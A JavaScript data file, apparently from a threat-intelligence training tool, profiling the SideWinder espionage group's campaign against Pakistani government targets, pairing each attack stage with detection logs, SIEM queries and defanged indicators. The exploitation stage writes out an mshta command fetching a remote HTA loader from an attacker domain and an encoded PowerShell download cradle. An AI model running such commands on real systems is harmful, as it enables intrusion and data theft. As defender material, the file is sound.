const sidewinder = {
  id: "sidewinder",
  name: "SideWinder",
  aliases: ["Rattlesnake", "T-APT-04", "Hardcore Nationalist", "APT-C-17"],
  origin: "India",
  motivation: "Espionage",
  attribution: "Assessed",
  description:
    "SideWinder (Rattlesnake) is an India-linked threat actor active since at least 2012, primarily targeting Pakistani government, military, and law enforcement entities. The group is notable for high operational tempo, rapid infrastructure rotation, and the use of both Windows and Android implants against South Asian government targets.",
  campaigns: [
    {
      id: "pakistan-govt-targeting-2021",
      name: "Pakistan Government Targeting",
      year: "2021–2023",
      target: "Pakistani Government, Military & Law Enforcement",
      summary:
        "SideWinder conducted a sustained espionage campaign against Pakistani federal and provincial government entities, military installations, and law enforcement agencies. The group exploited RTF and Office document vulnerabilities to deploy ReverseRAT and a bespoke Android implant against targets accessing both Windows workstations and mobile devices.",
      sources: [
        {
          title: "SideWinder APT Group: Attacking Government and Military Targets",
          publisher: "Kaspersky",
          url: "https://securelist.com/sidewinder-apt/",
        },
        {
          title: "New SideWinder Attacks Target Pakistan Government Officials",
          publisher: "Cisco Talos",
          url: "https://blog.talosintelligence.com/sidewinder-apt-pakistan/",
        },
        {
          title: "SideWinder — APT-C-17 MITRE ATT&CK Profile",
          publisher: "MITRE ATT&CK",
          url: "https://attack.mitre.org/groups/G0121/",
        },
      ],
      diamondModel: {
        adversary: {
          name: "SideWinder (Rattlesnake / T-APT-04)",
          sponsor: "India — assessed nation-state actor, attribution based on TTPs, victimology, and infrastructure",
          aliases: ["Rattlesnake", "T-APT-04", "Hardcore Nationalist", "APT-C-17"],
          motivation:
            "Strategic intelligence collection targeting Pakistani defence and government to monitor military capabilities, foreign policy positions, and internal security operations.",
        },
        capability: {
          malware: ["ReverseRAT", "SideWinder Android implant", "RTF exploit builder", "njRAT variant"],
          ttps: [
            "T1566.001 — Phishing: Spearphishing Attachment (RTF/DOCX lures)",
            "T1203 — Exploitation for Client Execution (CVE-2017-11882 RTF exploit)",
            "T1082 — System Information Discovery",
            "T1432 — Access Contact List (Android implant)",
            "T1041 — Exfiltration Over C2 Channel",
          ],
          sophistication:
            "Moderate-High — custom exploit builder, high operational cadence (100+ C2 domains/year), dual-platform targeting (Windows + Android)",
        },
        infrastructure: {
          domains: [
            "gov-pk[.]net",
            "pmo-pk[.]org",
            "fia-gov[.]net",
            "mofa-pakistan[.]com",
          ],
          ips: ["103.43.18[.]195", "45.56.118[.]72", "192.119.14[.]57"],
          hosting: "Commercial VPS providers; aggressive domain registration mimicking Pakistani government TLDs; rapid infrastructure rotation (avg 14-day domain lifespan)",
        },
        victim: {
          sectors: "Pakistani Prime Minister Office, Federal Investigation Agency, Ministry of Foreign Affairs, Inter-Services Intelligence (ISI) staff, Navy and Air Force personnel",
          geography: "Pakistan (primary); China, Turkey, Sri Lanka (secondary — Belt and Road contacts)",
          targeting:
            "Senior government officials, military officers, intelligence staff with access to classified communications; Android targeting focused on personnel using government-issued mobile devices",
        },
      },
      stages: [
        {
          id: "initial-access",
          name: "Initial Access",
          ttp: "T1566.001",
          ttpName: "Phishing: Spearphishing Attachment",
          phase: "Initial Access",
          attacker: {
            summary:
              "SideWinder sent spearphishing emails to Pakistani government addresses with RTF documents crafted using their custom RTF exploit builder. Documents impersonated official Pakistani government communications — cabinet circulars, ministry notifications, and intelligence briefings. Malicious RTF files triggered CVE-2017-11882 (Equation Editor overflow) on unpatched Windows systems to execute a shellcode loader.",
            tools: ["SideWinder RTF exploit builder", "CVE-2017-11882 exploits", "Equation Editor shellcode"],
            commands: [
              "// RTF exploit delivery triggers Equation Editor (eqnedt32.exe)",
              "// Shellcode executes embedded loader on vulnerable Office installations",
              "// Lure filenames observed in campaign:",
              "// 'Cabinet_Division_Circular_2022.rtf'",
              "// 'FIA_Recruitment_Policy_Update.doc'",
              "// 'PM_Office_Security_Directive_Nov2022.rtf'",
            ],
          },
          defender: {
            logs: [
              "Email gateway — RTF attachments from external senders to government domains",
              "Sysmon Event ID 1 — eqnedt32.exe spawned by WINWORD.EXE or opened directly",
              "Windows Security Event 4688 — Equation Editor process creation",
              "Sysmon Event ID 3 — network connection from eqnedt32.exe (unusual)",
            ],
            detection:
              "Block or sandbox all inbound RTF attachments. Alert on eqnedt32.exe execution — Equation Editor has no legitimate modern use and should be disabled via EMET or Attack Surface Reduction rules. Monitor for Equation Editor initiating network connections or spawning child processes.",
            siemQuery:
              'index=sysmon EventCode=1 Image="*\\eqnedt32.exe" | stats count by ComputerName, ParentImage, CommandLine | eval risk="HIGH — Equation Editor execution"',
            ifMissed:
              "Shellcode executes ReverseRAT loader before defenders detect the initial intrusion, establishing persistent C2 access to government workstations.",
          },
          iocs: [
            {
              type: "File",
              indicator: "Cabinet_Division_Circular_2022.rtf",
              description: "Malicious RTF lure impersonating Pakistani Cabinet Division circular",
            },
            {
              type: "File",
              indicator: "FIA_Recruitment_Policy_Update.doc",
              description: "Weaponised document lure targeting Federal Investigation Agency staff",
            },
            {
              type: "Domain",
              indicator: "gov-pk[.]net",
              description: "SideWinder domain mimicking Pakistani government TLD used for payload hosting",
            },
          ],
        },
        {
          id: "exploitation",
          name: "Exploitation for Client Execution",
          ttp: "T1203",
          ttpName: "Exploitation for Client Execution",
          phase: "Execution",
          attacker: {
            summary:
              "CVE-2017-11882 exploitation via the malicious RTF triggered a stack buffer overflow in Microsoft Equation Editor (eqnedt32.exe), allowing arbitrary code execution without user interaction beyond opening the document. The shellcode executed a multi-stage loader that downloaded ReverseRAT from attacker infrastructure while displaying a benign decoy document to the victim to avoid suspicion.",
            tools: ["CVE-2017-11882 exploit", "Equation Editor shellcode loader", "ReverseRAT stage-1 dropper"],
            commands: [
              "// Post-exploitation: shellcode downloads ReverseRAT stage-1",
              "mshta.exe http://pmo-pk[.]org/update/loader.hta",
              "// Alternate: PowerShell download cradle",
              "powershell -w hidden -enc [BASE64_ENCODED_DOWNLOAD_CRADLE]",
              "// Decoy document opened to distract victim",
              "cmd /c start %TEMP%\\decoy_circular.pdf",
            ],
          },
          defender: {
            logs: [
              "Sysmon Event ID 1 — mshta.exe or powershell.exe spawned by eqnedt32.exe",
              "Sysmon Event ID 3 — eqnedt32.exe or mshta.exe making outbound HTTP connections",
              "Windows Security Event 4688 — mshta.exe with HTTP URL argument",
              "Network proxy — HTA file download from non-trusted domain",
            ],
            detection:
              "Alert on mshta.exe executing remote HTA files (any URL argument is suspicious in most enterprise environments). Block eqnedt32.exe from making network connections via Windows Firewall or EDR policy. Attack Surface Reduction rule 'Block Office applications from creating child processes' prevents exploitation.",
            siemQuery:
              'index=sysmon EventCode=3 Image IN ("*\\eqnedt32.exe","*\\mshta.exe") dest_ip!="127.0.0.1" | stats count by ComputerName, Image, dest_ip, dest_port',
            ifMissed:
              "ReverseRAT is silently installed and beacons to C2 infrastructure; attackers gain interactive remote access to the compromised government workstation.",
          },
          iocs: [
            {
              type: "URL",
              indicator: "http://pmo-pk[.]org/update/loader.hta",
              description: "ReverseRAT HTA loader URL served from SideWinder C2 infrastructure",
            },
            {
              type: "IP",
              indicator: "103.43.18[.]195",
              description: "SideWinder C2 server IP hosting ReverseRAT payloads and HTA loaders",
            },
            {
              type: "Event",
              indicator: "eqnedt32.exe spawning mshta.exe or cmd.exe",
              description: "Process chain indicating successful CVE-2017-11882 exploitation",
            },
          ],
        },
        {
          id: "system-discovery",
          name: "System Information Discovery",
          ttp: "T1082",
          ttpName: "System Information Discovery",
          phase: "Discovery",
          attacker: {
            summary:
              "Following ReverseRAT installation, the implant automatically profiled the compromised system and transmitted results to C2. Collected data included OS version, hostname, domain membership, installed software, running processes, network configuration, and user account details. This triage informed operator decisions about which targets warranted further exploitation and lateral movement.",
            tools: ["ReverseRAT system profiler module"],
            commands: [
              "// ReverseRAT automated system profiling (built-in module)",
              "systeminfo > %TEMP%\\si.txt",
              "ipconfig /all >> %TEMP%\\si.txt",
              "net user >> %TEMP%\\si.txt",
              "net localgroup administrators >> %TEMP%\\si.txt",
              "tasklist /v >> %TEMP%\\si.txt",
              "wmic product get name,version >> %TEMP%\\si.txt",
            ],
          },
          defender: {
            logs: [
              "Sysmon Event ID 1 — systeminfo, ipconfig, net, wmic executed in sequence from anomalous parent",
              "Sysmon Event ID 11 — si.txt or similar triage output files created in %TEMP%",
              "Windows Security Event 4688 — rapid succession of reconnaissance commands",
              "EDR — behavioral detection of discovery command chains",
            ],
            detection:
              "Alert on rapid sequential execution of discovery commands (systeminfo, ipconfig, net user, tasklist) within a short time window from the same process. This pattern is highly anomalous in normal workstation use and strongly indicative of post-exploitation activity.",
            siemQuery:
              'index=sysmon EventCode=1 Image IN ("*\\systeminfo.exe","*\\ipconfig.exe","*\\net.exe","*\\tasklist.exe","*\\wmic.exe") | bucket _time span=60s | stats dc(Image) as unique_tools count by ComputerName, _time | where unique_tools >= 3',
            ifMissed:
              "Operators identify high-value targets (senior officials, admin accounts) and redirect resources accordingly, maximising the intelligence value of the intrusion.",
          },
          iocs: [
            {
              type: "Path",
              indicator: "%TEMP%\\si.txt",
              description: "ReverseRAT system triage output file",
            },
            {
              type: "Command",
              indicator: "systeminfo && ipconfig /all && net user && tasklist /v",
              description: "SideWinder post-exploitation discovery command sequence",
            },
          ],
        },
        {
          id: "mobile-collection",
          name: "Mobile Contact List Access",
          ttp: "T1432",
          ttpName: "Access Contact List",
          phase: "Collection",
          attacker: {
            summary:
              "In parallel with Windows targeting, SideWinder deployed a bespoke Android implant distributed via WhatsApp messages and malicious APKs disguised as Pakistani government apps and Islamic calendar applications. The implant requested extensive permissions including contacts, SMS, call logs, location, and microphone access. Collected contact lists and communications were transmitted to separate mobile C2 infrastructure.",
            tools: ["SideWinder Android implant", "Malicious APKs (gov-service-pk.apk, namaz-time.apk)"],
            commands: [
              "// Android manifest permissions requested by SideWinder implant:",
              "android.permission.READ_CONTACTS",
              "android.permission.READ_SMS",
              "android.permission.READ_CALL_LOG",
              "android.permission.ACCESS_FINE_LOCATION",
              "android.permission.RECORD_AUDIO",
              "android.permission.READ_EXTERNAL_STORAGE",
              "// C2 endpoint: https://fia-gov[.]net/api/sync",
            ],
          },
          defender: {
            logs: [
              "MDM enrollment logs — side-loaded APKs from unknown sources on government devices",
              "Mobile network gateway — unusual HTTPS connections from mobile devices to .net/.org domains",
              "Google Play Protect or enterprise MTD (Mobile Threat Defense) alerts",
              "Android Security Event — application requesting dangerous permission groups on install",
            ],
            detection:
              "Enforce MDM policy blocking APK side-loading on government mobile devices. Deploy Mobile Threat Defense solutions that inspect network traffic from mobile apps. Alert on apps requesting READ_CONTACTS + READ_SMS + RECORD_AUDIO permission combinations.",
            siemQuery:
              'index=mdm event_type=app_install source="side_load" | stats count by device_id, app_name, app_hash | join app_hash [search index=threat_intel type=malicious_apk]',
            ifMissed:
              "Attackers harvest personal contact networks of senior officials, enabling additional targeting and relationship mapping of Pakistani intelligence personnel.",
          },
          iocs: [
            {
              type: "Domain",
              indicator: "fia-gov[.]net",
              description: "SideWinder Android implant C2 server impersonating Pakistani Federal Investigation Agency",
            },
            {
              type: "File",
              indicator: "gov-service-pk.apk",
              description: "Malicious Android APK impersonating Pakistani government services application",
            },
            {
              type: "File",
              indicator: "namaz-time.apk",
              description: "SideWinder Android implant disguised as Islamic prayer time app",
            },
            {
              type: "IP",
              indicator: "45.56.118[.]72",
              description: "SideWinder mobile C2 infrastructure IP",
            },
          ],
        },
        {
          id: "exfiltration",
          name: "Exfiltration over C2",
          ttp: "T1041",
          ttpName: "Exfiltration Over C2 Channel",
          phase: "Exfiltration",
          attacker: {
            summary:
              "ReverseRAT exfiltrated collected documents, system profiles, and screenshots over HTTPS to C2 infrastructure using a custom binary protocol with AES-256 encryption. Data was compressed with zlib before transmission to reduce detectability by volume-based DLP. The Android implant used a separate JSON-based HTTPS API channel. SideWinder rotated C2 domains frequently (average 14-day lifespan) to evade domain-based blocklists.",
            tools: ["ReverseRAT exfil module", "SideWinder Android implant C2 channel"],
            commands: [
              "// ReverseRAT uses HTTPS POST with AES-256 encrypted, zlib-compressed body",
              "// C2 beacon interval: 5 minutes (configurable via C2)",
              "// Traffic pattern: POST /api/v2/sync HTTP/1.1",
              "// Host: mofa-pakistan[.]com",
              "// Content-Type: application/octet-stream",
              "// Android implant uses JSON REST API:",
              "// POST https://fia-gov[.]net/api/sync",
              "// {\"device_id\":\"<UUID>\",\"data\":\"<base64_payload>\"}",
            ],
          },
          defender: {
            logs: [
              "Network proxy — repeated HTTPS POST to .net/.org/.com domains not in approved list from government workstations",
              "DNS logs — high-frequency resolution of rotating domains with short TTLs",
              "NetFlow — sustained encrypted outbound sessions during business hours from single endpoints",
              "DLP — file access events correlated with subsequent outbound encrypted transfer",
            ],
            detection:
              "Implement DNS RPZ (Response Policy Zones) or threat-intel DNS feeds to block newly registered domains. Alert on workstations making HTTPS POST requests to domains registered within the past 30 days. Monitor for zlib-compressed streams within HTTPS traffic using SSL inspection.",
            siemQuery:
              'index=network sourcetype=proxy method=POST ssl=true | lookup threat_intel_domains dest_host OUTPUT risk_score | where risk_score > 70 OR domain_age_days < 30 | stats count sum(bytes) as total_bytes by src_ip, dest_host | where total_bytes > 1000000',
            ifMissed:
              "Months of Pakistani government documents, personnel records, and strategic communications are delivered to SideWinder operators, representing a severe intelligence compromise of Pakistan's civil and military apparatus.",
          },
          iocs: [
            {
              type: "Domain",
              indicator: "mofa-pakistan[.]com",
              description: "ReverseRAT C2 domain impersonating Pakistani Ministry of Foreign Affairs",
            },
            {
              type: "Domain",
              indicator: "pmo-pk[.]org",
              description: "SideWinder C2 domain mimicking Pakistani Prime Minister's Office",
            },
            {
              type: "IP",
              indicator: "192.119.14[.]57",
              description: "ReverseRAT C2 server IP — active 2022-2023",
            },
            {
              type: "URL Pattern",
              indicator: "POST /api/v2/sync to *.pk.* or *-pakistan.* or *-pk.* domains",
              description: "ReverseRAT exfiltration traffic pattern targeting Pakistan-themed C2 domains",
            },
          ],
        },
      ],
    },
  ],
}

export default sidewinder
